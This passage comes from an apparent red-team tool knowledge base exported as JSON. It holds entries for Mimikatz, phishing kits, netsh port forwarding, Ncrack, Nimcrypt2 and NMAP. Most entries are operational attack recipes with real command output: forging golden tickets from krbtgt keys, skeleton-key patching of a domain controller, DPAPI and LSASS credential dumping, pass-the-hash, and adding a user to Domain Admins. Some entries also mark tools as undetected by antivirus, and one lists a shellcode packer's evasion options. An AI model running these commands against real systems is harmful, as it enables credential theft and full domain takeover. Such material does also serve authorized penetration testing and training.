/user:CHILD\\krbtgt /domain:child.rto.local\naes256_hmac       (4096) : 0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477\n```\n\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain.\n-   `/sid` is the current domain SID.\n-   `/sids` is the SID of the target group to add ourselves to.\n-   `/aes256` is the AES256 key of the current domain's krbtgt account.\n-   `/startoffset` sets the start time of the ticket to 10 mins before the current time.\n-   `/endin` sets the expiry date for the ticket to 60 mins.\n-   `/renewmax` sets how long the ticket can be valid for if renewed.\n\n```beacon\nmimikatz kerberos::golden /user:Administrator /domain:child.rto.local /sid:S-1-5-21-1886337448-2504686659-850325809-512 /sids:S-1-5-21-2323903455-1895497758-3703895482-512 /aes256:0c5f44579dd7cd99796e0ca64506184e2779d4ab96690ac042a80e1d29097477 /startoffset:-10 /endin:600 /renewmax:10080\n```\n\n## [[Skeleton Key]]\n```\nbeacon> mimikatz !misc::skeleton\n[KDC] data\n[KDC] struct\n[KDC] keys patch OK\n[RC4] functions\n[RC4] init patch OK\n[RC4] decrypt patch OK\n\nbeacon> make_token EDU\\Administrator mimikatz\n[+] Impersonated EDU\\john\n\nbeacon> ls \\\\dc-2\\c$\n\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n dir     05/19/2022 11:11:35   $Recycle.Bin\n dir     05/10/2022 03:23:44   Boot\n dir     10/18/2016 01:59:39   Documents and Settings\n dir     05/23/2018 11:06:05   PerfLogs\n dir     12/13/2017 21:00:56   Program Files\n dir     05/10/2022 02:01:55   Program Files (x86)\n dir     03/10/2022 14:38:44   ProgramData\n dir     10/18/2016 02:01:27   Recovery\n dir     03/10/2022 13:52:03   Shares\n dir     05/19/2022 11:39:02   System Volume Information\n dir     03/11/2022 12:59:29   Users\n dir     05/19/2022 13:26:27   Windows\n 379kb    fil     01/28/2022 07:09:16   bootmgr\n 1b       fil     07/16/2016 13:18:08   BOOTNXT\n 448mb    fil     03/11/2022 09:19:53   pagefile.sys\n```\n\n## [[Data Protection API (DPAPI)]]\n#OPSEC Not recommended. Try gathering it from the DC\n\n>mimikatz vault::list\n>mimikatz sekurlsa::dpapi\n\n## Extract passwords locally\n1. Get subfolder path of {SID}\n``````sh\nGet-ChildItem C:\\Users\\$env:username\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\xxx\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        16.03.2022     13:00            468 29deba8c-55de-4930-97d5- 7d949402541b\n -a-hs-        16.03.2022     13:01            468 c3b72001-5fd0-4a1d-b548- b4e6fcecd431\n -a-hs-        24.01.2022     20:00             24 Preferred\n``````\n\n2. Choose one of the encrypted creds\n``````powershell\nGet-ChildItem -Hidden C:\\Users\\$env:username\\AppData\\Local\\Microsoft\\Credentials\n\n Mode                 LastWriteTime         Length Name\n ----                 -------------         ------ ----\n -a-hs-        05.01.2022     20:00           3252 040F76937B2E54B70658AF91D1BEBCCF\n -a-hs-        15.03.2022     14:06           3012 0437BF9439473166B0F4C16EC80BC809\n``````\n\n3. Check for guid masterkey of encrypted creds via [[Mimikatz]]\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF\n\n**BLOB**\n  dwVersion          : 00000001 - 1\n  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}\n  dwMasterKeyVersion : 00000001 - 1\n  guidMasterKey      : {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n``````\n\n4. Get DPAPI master key listed in 3 as guidMasterKey.\n``````powershell\ndpapi::masterkey /in:C:\\Users\\patri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3318663386-1925972964-1342212060-1001\\c3b72001-5fd0-4a1d-b548-b4e6fcecd431 /rpc\n\n# OR VIA LOCAL IF NOT DOMAIN JOINED\nsekurlsa::dpapi\n\nAuthentication Id : 0 ; 658810602 (00000000:2744a6ea)\nSession           : Interactive from 3\nUser Name         : patri\nDomain            : PHANTOM\nLogon Server      : (null)\nLogon Time        : 16.03.2022 12:59:58\nSID               : S-1-5-21-3318663386-1925972964-1342212060-1001\n         [00000000]\n         * GUID      :  {c3b72001-5fd0-4a1d-b548-b4e6fcecd431}\n         * Time      :  16.03.2022 13:07:03\n         * MasterKey :  877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf4333a7c38c[SNIP]21f9ba45cb6a1ea974839762\n         * sha1(key) :  71e8820de4c5f31bc7d81c44ed85bcc720e46536\n         [00000001]\n         * GUID      :  {29deba8c-55de-4930-97d5-7d949402541b}\n         * Time      :  16.03.2022 13:32:13\n         * MasterKey :  976241ce72ce24871d8b5c05775549a8025e4a8d8c52594c57d7d8206dd5d4f0889c9a242d2fed8b562c703f82[SNIP]091ce38cbb27346be13abef8\n         * sha1(key) :  c27a0c1eb6a9b65c698cad771fa6346e3517e148\n``````\n\n5. decrypt file from 2 with key from 4.\n``````powershell\ndpapi::cred /in:C:\\Users\\patri\\AppData\\Local\\Microsoft\\Credentials\\040F76937B2E54B70658AF91D1BEBCCF /masterkey:877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf433[SNIP]21f9ba45877b1426c72cb\n``````\n\n## [[Cached Domain Credentials]]\nUnfortunately, the hash format is not NTLM.\n\nTo crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`.\n\n``````\nbeacon> mimikatz lsadump::cache\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\n\nLocal name : SRV1 ( S-1-5-21-4124990477-354564332-720757739 )\nDomain name : EDU ( S-1-5-21-3263068140-2042698922-2891547269 )\nDomain FQDN : edu.evil.corp\n\nPolicy subsystem is : 1.14\nLSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}\n  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983\n\n* Iteration is set to default (10240)\n\n[NL$1 - 2/25/2022 1:07:37 PM]\nRID       : 00000460 (1120)\nUser      : EDU\\john\nMsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419\n\n[NL$2 - 5/17/2022 2:00:46 PM]\nRID       : 0000046e (1134)\nUser      : EDU\\svc_mssql\nMsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6\n\n[NL$3 - 5/17/2022 2:00:50 PM]\nRID       : 00000462 (1122)\nUser      : EDU\\doe\nMsCacheV2 : 673e2fe26e26e79c58379168b79890f6\n``````\n\n## [[eKeys]]\nThis Mimikatz module will dump [[Kerberos]] encryption keys.\n``````beacon\nbeacon> mimikatz sekurlsa::ekeys\n\nAuthentication Id : 0 ; 113277 (00000000:0001ba7d)\nSession           : Interactive from 1\nUser Name         : doe\nDomain            : EDU\nLogon Server      : DC-2\nLogon Time        : 5/24/2022 9:00:11 AM\nSID               : S-1-5-21-3263068140-2042698922-2891547269-1122\n\n * Username : doe\n * Domain   : edu.evil.corp\n * Password : (null)\n * Key List :\n aes256_hmac       a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n rc4_hmac_nt       4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old      4ffd3eabdce2e158d923ddec72de979e\n rc4_md4           4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_nt_exp   4ffd3eabdce2e158d923ddec72de979e\n rc4_hmac_old_exp  4ffd3eabdce2e158d923ddec72de979e\n``````\n\n## [[LSASS dumping]]\n``````\nbeacon> mimikatz sekurlsa::logonpasswords\n``````\n\n## [[Pass-the-Hash]]\n#OPSEC this to specify the programm and avoid the weird piping into cmd.exe\n## Recommended\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e\n\nuser    : doe\ndomain    : edu.evil.corp\nprogram    : cmd.exe\nimpers.    : no\nNTLM    : 4ffd3eabdce2e158d923ddec72de979e\n  |  PID  6284\n  |  TID  6288\n  \nbeacon> steal_token 6284\n[+] Impersonated NT AUTHORITY\\SYSTEM\n``````\n\n## [[Security Account Manager]]\n``````\nbeacon> mimikatz lsadump::sam\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\nLocal SID : S-1-5-21-4124990477-354564332-720757739\n\nSAMKey : fb5c3670b47e5ecae21f328b12d3103c\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n``````\n\n",
    "commands": [
      {
        "id": "0fc51c4d-d9ef-49e0-a4e5-f8f7ccc15c06",
        "name": "Dump Forest Trust Key",
        "description": "",
        "tag": "",
        "results": [
          "CRED:HASH:TRUSTKEY"
        ],
        "cmd": "lsadump::trust /path",
        "requirements": {
          "tag": "PRIVS:ADMIN"
        }
      },
      {
        "id": "1d8cbd1d-35aa-441a-9fcc-d88d900b472a",
        "name": "Create Golden Ticket with Inter-Realm-Key",
        "description": "",
        "tag": "",
        "results": [
          "CRED:TICKET:TGT:GOLDEN"
        ],
        "cmd": "kerberos::golden /domain:current_domain /sid:current_domain_s_SID\n/rc4:forest_trust_key_NTLM_hash /user:Administrator /service:krbtgt\n/target:external_domain_FQDN /ticket:path_to_save_the_TGS",
        "requirements": {
          "and": [
            {
              "tag": "INTEL:DOMAIN:SID"
            },
            {
              "tag": "INTEL:DOMAIN:DOMAINS"
            },
            {
              "tag": "CRED:HASH:TRUSTKEY"
            },
            {
              "tag": "INTEL:DOMAIN:TRUSTS"
            }
          ]
        }
      }
    ],
    "latest_commit": "2023-05-09T12:45:53Z"
  },
  {
    "name": "MiniDump",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/cube0x0/MiniDump",
    "description": "C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps.",
    "undetected": [],
    "detected": [],
    "content": "## [[LSASS dumping]]\n\n",
    "commands": [],
    "latest_commit": "2021-10-13T18:00:46Z"
  },
  {
    "name": "mip22",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/makdosx/mip22",
    "description": "83 default websites, clone any site with manual method, add any site with customize method, mask link with subdomains, url shortener, audio notice for view the credentials live, music in background etc...",
    "undetected": [],
    "detected": [],
    "content": "## [[Phishing]]\n\n",
    "commands": [],
    "latest_commit": "2022-07-29T02:49:50Z"
  },
  {
    "name": "mmc",
    "phases": [
      "02. Reconnaissance",
      "03. Host Enumeration",
      "04. Persistence"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console",
    "description": "Sie verwenden die Microsoft Management Console (MMC) zum Erstellen, Speichern und \u00d6ffnen von Verwaltungstools, die als Konsolen bezeichnet werden und die Hardware-, Software- und Netzwerkkomponenten Ihres Microsoft Windows-Betriebssystems verwalten. MMC wird auf allen Clientbetriebssystemen ausgef\u00fchrt, die derzeit unterst\u00fctzt werden.",
    "undetected": [
      "Windows Defender (AV)",
      "MDE",
      "Symantec",
      "McAfee"
    ],
    "detected": [],
    "content": "\n## [[Local User+Groups]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Local users and Groups\n\n## [[Services]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Services\nor 'services.msc'\n\n## [[Priv Esc/Scheduled Tasks]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Task Scheduler\nor 'taskschd.msc'\n\n## [[Shares]] [[Logged In Users]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Shared Folders\n\n\n",
    "commands": [
      {
        "id": "7fd3f7e7-ca8b-4542-9325-ae91732108b5",
        "name": "Get local User + Groups",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:LOCAL:GROUPS",
          "INTEL:LOCAL:USERS"
        ],
        "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Local users and Groups"
      },
      {
        "id": "024c607e-cffa-4979-baf4-e4419ed64b6d",
        "name": "Get Services",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:SERVICES"
        ],
        "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Services or services.msc"
      },
      {
        "id": "7c159eb2-0da5-4c50-9191-5fecc8d0ea1c",
        "name": "Get Scheduled Tasks",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Task Scheduler"
      },
      {
        "id": "72007278-9a35-4397-acb2-dac2a0266e84",
        "name": "Get Scheduled Tasks #2",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "taskschd.msc"
      },
      {
        "id": "30bb7475-c25b-4efc-b9be-ea390e81c89c",
        "name": "Get Shares + User Sessions",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:SESSIONS",
          "COMPUTER:SHARES"
        ],
        "cmd": "Launch mmc.exe, click File > Add\\remove snap-in > Shared Folders"
      }
    ]
  },
  {
    "name": "mssqlclient",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "Impacket",
    "description": "Interact with MSSQL DB",
    "undetected": [],
    "detected": [],
    "content": "# mssqlclient.py\n\n## [[MS SQL Servers]]\n```bash\nproxychains python3 /usr/local/bin/mssqlclient.py -windows-auth EDU/john@10.10.1.20\n\nProxyChains-3.1 (http://proxychains.sf.net)\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n|S-chain|-<>-127.0.0.1:1080-<><>-10.10.1.20:1433-<><>-OK\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SRV1): Line 1: Changed database context to 'master'.\n[*] INFO(SRV1): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)\n[<>] Press help for extra shell commands\nSQL> select @@servername;\n\nSRV1\n```\n\n\n",
    "commands": []
  },
  {
    "name": "MultiRelay",
    "phases": [
      "07. Lateral Movement",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "",
    "description": "Relaying like NTLM",
    "undetected": [],
    "detected": [],
    "content": "# MultiRelay\n\n## [[NTLM Relaying]] [[NTLM Relaying to ADCS]]\n\n\n",
    "commands": []
  },
  {
    "name": "nbtscan",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/charlesroelli/nbtscan",
    "description": "NBTscan is a program for scanning IP networks for NetBIOS name information. It sends NetBIOS status queries to each address in the supplied range and lists received information in human-readable form.",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "f5f60dff-5db9-4e91-bfc6-ef010e5450f2",
        "name": "Help",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Usage:\nnbtscan [-v] [-d] [-e] [-l] [-t TIMEOUT] [-b BANDWIDTH] [-r] [-q] [-s SEPARATOR] [-m RETRANSMITS] (-f FILENAME)|(IP_OR_RANGE)\n\nOptions:\n-v      verbose output. Print all names received\n        from each host\n-d      dump packets. Print whole packet contents.\n-e      Format output in /etc/hosts format.\n-l      Format output in lmhosts format.\n        Cannot be used with -v, -s or -h options.\n-t      timeout  wait timeout milliseconds for response.\n        Default 1000.\n-b      bandwidth    Output throttling. Slow down output\n        so that it uses no more that bandwidth bps.\n        Useful on slow links, so that ougoing queries\n        don't get dropped.\n-r      use local port 137 for scans. Win95 boxes\n        respond to this only.\n        You need to be root to use this option on Unix.\n-q      Suppress banners and error messages,\n-s      separator    Script-friendly output. Don't print\n        column and record headers, separate fields with separator.\n-h      Print human-readable names for services.\n        Can only be used with -v option.\n-m      retransmits  Number of retransmits. Default 0.\n-f      filename Take IP addresses to scan from file filename.\n        -f - makes nbtscan take IP addresses from stdin.\n<scan_range>  what to scan. Can either be single IP\n        like 192.168.1.1 or\n        range of addresses in one of two forms: \n        xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx."
      },
      {
        "id": "0a58163e-9031-4310-bd3a-64aa03e6e579",
        "name": "Scans 192.168.1.0/24 subnet",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "nbtscan -r 192.168.1.0/24"
      },
      {
        "id": "c5110585-947e-4d16-af3e-9ab6028822fc",
        "name": "Scans C-class network",
        "description": "Prints results in script-friendly format using colon as field separator",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "nbtscan -v -s : 192.168.1.0/24"
      },
      {
        "id": "d49dacf9-1f3c-4895-8567-06ef3fe628f3",
        "name": "Scan 192.168.1.0/24 subnet with service names",
        "description": "list all names received from each host (-v), print human-readable service names (-h)",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "nbtscan -h -v 192.168.1.0/24"
      }
    ],
    "latest_commit": "2016-05-26T20:16:52Z"
  },
  {
    "name": "Ncrack",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/nmap/ncrack",
    "description": "Password spray against a lot of services",
    "undetected": [],
    "detected": [],
    "content": "# Ncrack\n\n[https://nmap.org/ncrack/man.html](https://nmap.org/ncrack/man.html)\n\nServices\n\n|  |  |  |  |\n|---|---|---|---|\n| FTP | SSH | TELNET | HTTP(s) |\n| POP3(s) | SMB | RDP | VNC |\n\n\nScope\n\n```java\nncrack 10.10.10.0/24\nncrack add.els.com\nncrack 10.10.1,2.1-200 //10.10.1.1-200 + 10.10.2.1-200\nncrack 10.10.10.56\n```\n\nRunning\n\n```java\n<service_name>://target:<port_number>\nncrack ssh://10.10.10.130\n//multiple\nncrack telnet://10.10.10.130:25 telnet://10.10.10.131:25\n//global settings\nncrack 10.10.10.10,15 -p ssh:50,telnet\n```\n\nOptions\n\n```java\n--passwords-first //to try all pws for each user\n--resume <path> //continue a previously saved session\n-U <username_wordlist>\n-P <password_wordlist>\n-u username1,username2\n-p pwd1,pwd2\n-o [N/X/L] //xml output\n-i [N/X/L] // provide nmap results to ncrack\n```\n\n\n",
    "commands": [],
    "latest_commit": "2023-02-22T21:33:24Z"
  },
  {
    "name": "Net",
    "phases": [
      "03. Host Enumeration",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems",
    "description": "Net Commands can be used to perform operations on Groups, users, account policies, shares, and so on.",
    "undetected": [],
    "detected": [],
    "content": "# Net\n\n## [[Local User+Groups]]\n1. Create User:\n    '''bash\n    net user Patrick patrick12345! /ADD /DOMAIN\n    '''\n2. List local / domain groups\n    '''bash\n    net group /domain\n\n    Gruppenkonten f\u00fcr \\\\dc1.testdomain.local\n    -------------------------------------------------------------------------------\n    *$7O...\n    *Abteilung_....\n    *Dom\u00e4nen-Admins\n    \n    net localgroup [group (Remote Dektop Users)]\n    '''\n1. Add User to domain /local group\n    '''sh\n    net group \"Dom\u00e4nen-Admins\" Patrick /add /domain\n\n    net localgroup \"Remote Desktop Users\" Patrick /add\n    net localgroup \"Administrators\" Patrick /add\n    '''\n\n## [[Domain Controller]]\nFrom domain joined device  \n>net group \"domain controllers\" /domain\n>nslookup dc-01\n>net time\n\n## [[Web Proxies]]\n''''''beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> run net user john /domain\nThe request will be processed at a domain controller for domain edu.evil.corp.\n[...snip...]\n\nGlobal Group memberships     *Domain Users         *Roaming Users        \n                             *Developers           *Proxy Users\n''''''\n\n\n\n",
    "commands": [
      {
        "id": "bcd159d3-a6d6-4ba3-baa3-a514177f138d",
        "name": "View Computers ",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "net view /domain:ecorp"
      }
    ]
  },
  {
    "name": "netcat",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "http//netcat.sourceforge.net/",
    "description": "Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.",
    "undetected": [],
    "detected": [],
    "content": "# netcat\n\nVersions\n--------\n\n1.  nc\n2.  ncat (nmap BETTER)\n\n  \nRun\n------\n\n*   Listen one connection:\n\n```java\nnc -lvp 8080\n```\n\n*   Listen all the time: (Windows)\n\n```java\nnc -Lvp 8080\n```\n\n*   Connect:\n\n```java\nnetcat -u host port\n```\n\nQuelle:\u00a0[https://www.sans.org/security-resources/sec560/netcat\\_cheat\\_sheet\\_v1.pdf](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)\n\n\n",
    "commands": []
  },
  {
    "name": "netsh",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "",
    "description": "",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Reverse Port Forward]]\nMachines:\n\n| Nr | System | Task |\n| -- | ------ | ---- |\n| 1  | _dc1.edu.evil.corp_ | Proxy Server |\n| 2  | _ad.evil2.corp_ | Target |\n| 3  | _dc1.evil.corp_ | Start |\n\n1. Create proxy on 1 to forward to 2 port 4444\n`netsh interface portproxy` allows to view and configure a proxy for both IPv4 and IPv6 traffic between networks.\n>netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp\n\nWhere:\n-   **listenaddress** is the IP address to listen on (probably always 0.0.0.0).\n-   **listenport** is the port to listen on.\n-   **connectaddress** is the destination IP address.\n-   **connectport** is the destination port.\n-   **protocol** to use (always TCP).\n\n>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp\n\n2. Verify its there with `netsh interface portproxy show`. \n```cmd\nC:\\>netsh interface portproxy show v4tov4\nListen on ipv4:             Connect to ipv4:\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n0.0.0.0         4444        10.10.14.55    4444\n```\n\n3. Connect from 3 zu 1 and you will see the connection being made in the PowerShell script.\n\nTest if the proxy works on 2:\n``````powershell\n$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)\n$listener = New-Object System.Net.Sockets.TcpListener $endpoint\n$listener.Start()\nWrite-Host \"Listening on port 4444\"\nwhile ($true)\n{\n  $client = $listener.AcceptTcpClient()\n  Write-Host \"A client has connected\"\n  $client.Close()\n}\n``````\n\nInitiate connection from 3.\n``````powershell\nPS C:\\> Test-NetConnection -ComputerName 10.10.1.8 -Port 4444\n\nComputerName     : 10.10.1.8\nRemoteAddress    : 10.10.1.8\nRemotePort       : 4444\nInterfaceAlias   : Ethernet\nSourceAddress    : 10.10.2.78\nTcpTestSucceeded : True\n``````\n\n4. To remove the portproxy:\n>C:\\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444\n\nAspects to note about netsh port forwards:\n- You need to be a local administrator to add and remove them, regardless of the bind port.\n- They're socket-to-socket connections, so they can't be made through network devices such as firewalls and web proxies.\n- They're particularly good for creating relays between machines.\n\n",
    "commands": []
  },
  {
    "name": "NexPhisher",
    "phases": [
      "01. Initial Access"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/htr-tech/nexphisher",
    "description": "Advanced Phishing tool for Linux & Termux",
    "undetected": [],
    "detected": [],
    "content": "## [[Phishing]]\n\n",
    "commands": [],
    "latest_commit": "2022-10-12T09:34:43Z"
  },
  {
    "name": "Nimcrypt2",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/icyguider/Nimcrypt2",
    "description": ".NET, PE, & Raw Shellcode Packer/Loader written in Nim",
    "undetected": [],
    "detected": [],
    "content": "## [[Obfuscation]]\n```sh\nUsage:\n  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]\n  nimcrypt (-h | --help)\n\nOptions:\n  -h --help     Show this screen.\n  --version     Show version.\n  -f --file filename     File to load\n  -t --type filetype     Type of file (csharp, raw, or pe)\n  -p --process process   Name of process for shellcode injection\n  -o --output filename   Filename for compiled exe\n  -u --unhook            Unhook ntdll.dll\n  -v --verbose           Enable verbose messages during execution\n  -e --encrypt-strings   Encrypt strings using the strenc module\n  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2\n  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary\n  -n --no-randomization  Disable syscall name randomization\n  -s --no-sandbox        Disable sandbox checks\n  --no-ppid-spoof        Disable PPID Spoofing\n```\n\n",
    "commands": [],
    "latest_commit": "2023-01-20T22:07:15Z"
  },
  {
    "name": "NMAP",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration",
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux",
      "Windows"
    ],
    "source": "https://nmap.org/",
    "description": "Nmap Free Security Scanner, Port Scanner, & Network Exploration Tool",
    "undetected": [],
    "detected": [],
    "content": "# NMAP\n\nScan phases\n===========\n\n1.  Script pre-scanning\n    1.  only when NSE scans\n    2.  executed once per run\n2.  Target enumeration\n    1.  executed once per run\n3.  Host discovery\n    1.  also known as \"Ping Scanning\"\n    2.  skipped with -Pn\n    3.  assume all hosts are online\n4.  Reverse-DNS resolution\n    1.  provides DNS name for ip address\u00a0\n    2.  skipped with -n\n    3.  force with -r\n5.  Port scanning\n    1.  executed once per host\n    2.  skipped with -sn\n6.  Version detection\n    1.  enabled with -sV\n7.  OS detection\n    1.  enable with -O\n8.  Traceroute\n    1.  enable with --traceroute\n9.  Script scanning\n    1.  most NSE is run here\n10.  Output\n    1.  write to screen or files\n11.  Script post-scanning\n    1.  possible to use but currently not used\n\nCommands\n========\n\n1.  Version:  \n    nmap -V\n2.  Help  \n    nmap, nmap -h, man nmap\n3.  Input  \n    \\-iL hostList\n4.  Output  \n    \\-oN textfile  \n    \\-oX xml  \n    \\-oS scriptkiddy  \n    \\-oG greppable format  \n    \\-oA normal + xml + greppable  \n    \\-v, -vv, -vvv increase level of details\n5.  TCP Flags  \n    \\-sS: TCP SYN scan  \n    \\-sA: TCP ACK scan  \n    \\-sT: TCP connect scan\n6.  ICMP scan  \n    Ping Scan\u00a0!= ICMP  \n    _nmap -sn -PE <target>_\n7.  NSE scripts\n    _nmap <option> -sC <target> (_launch all 'default' NSE  \n    nmap --script vuln --script-args=unsafe=1 -iL hostname.txt  \n    nmap --script-help=</script>\n    _nmap <option> --script=</script name or category , seperated> <target>_ (launch specific NSE script)  \n    _nmap --script ssl-enum-ciphers -p 443 www.example.com_\n8.  Scan-Technique  \n    \\-sS (TCP Syn Scan, default NMAP)  \n    \\-sT (TCP Connect Scan, default if no admin)  \n    \\-sU (UDP Scan)  \n    \\-sO (IP protocol Scan)\n9.  Discovery\u00a0Options  \n    \\-sL (List Scan)  \n    \\-sn (No Port Scan, called Ping Scan or Ping Sweep, GET MAC+IP+Name), ICMP echo request + TCP SYN to 443 + ACK to 80 + ICMP timestamp  \n    \\-Pn (No ping, 1000Ports for every IP), Skip discovery step  \n    \\-F (Most common 100 Ports)  \n    \\-n (No DNS resolution)  \n    \\-R (Resolve all using DNS)  \n    \\--traceroute (Trace path to host)  \n    \\--dns-server <server1>,<server2> (Use custom DNS server for PTR lookup)\n10.  TCP Flags  \n    \\-PS (SYN Ping)  \n    \\-PA (ACK Ping)  \n    \\-PU (UDP Ping)  \n    \\-PY (SCTP INIT Ping),\u00a0Stream Control Transmission Protocol  \n    \\-PO (IP Protocol Ping)  \n    \\-PE, -PP, -PM\u00a0(ICMP Ping)  \n    \\-PR (ARP Ping), Get-MAC address in a local network -sn is BETTER\n11.  States  \n    Open: Accept packets  \n    Closed: Is reachable but nothing excepts the packets  \n    Filtered: Packet filtering is blocking  \n    Unfiltered: Accessible but cannot detect\n12.  Timing templates  \n    \\-T0 (Paranoid, IDS evasion)  \n    \\-T1 (Sneaky, IDS evasion)  \n    \\-T2 (Polite, Slows down)  \n    \\-T3 (Normal (Default)  \n    \\-T4 (Aggressive, fast reliable network)  \n    \\-T5 (Insane, Very fast network)\n13.  Version detection  \n    \\-sS (Version detection)  \n    \\--version-light (--version-intensity 2)  \n    \\--version-all (--version-intensity 9)\n14.  OS discovery  \n    _nmap -T4 -O -v --script=smb-os-discovery_ (OS discovery)  \n    \\--osscan-limit (If not 1xOpen\u00a0 & 1xClosed port exist, nmap will NOT guess, reduce bullshit)  \n    \\--osscan-guess or --fuzzy (NMAP will best guess the OS)  \n    \\--max-os-tries <value> (increase speed)\n15.  ALL IN ONE  \n    \\-A (advanced and aggressive), detailed port scanning, version detection, os detection, and NSE 'default' scripts)\n\n######\n\n## [[OT Devices]]\n> .\\nmap.exe -p- 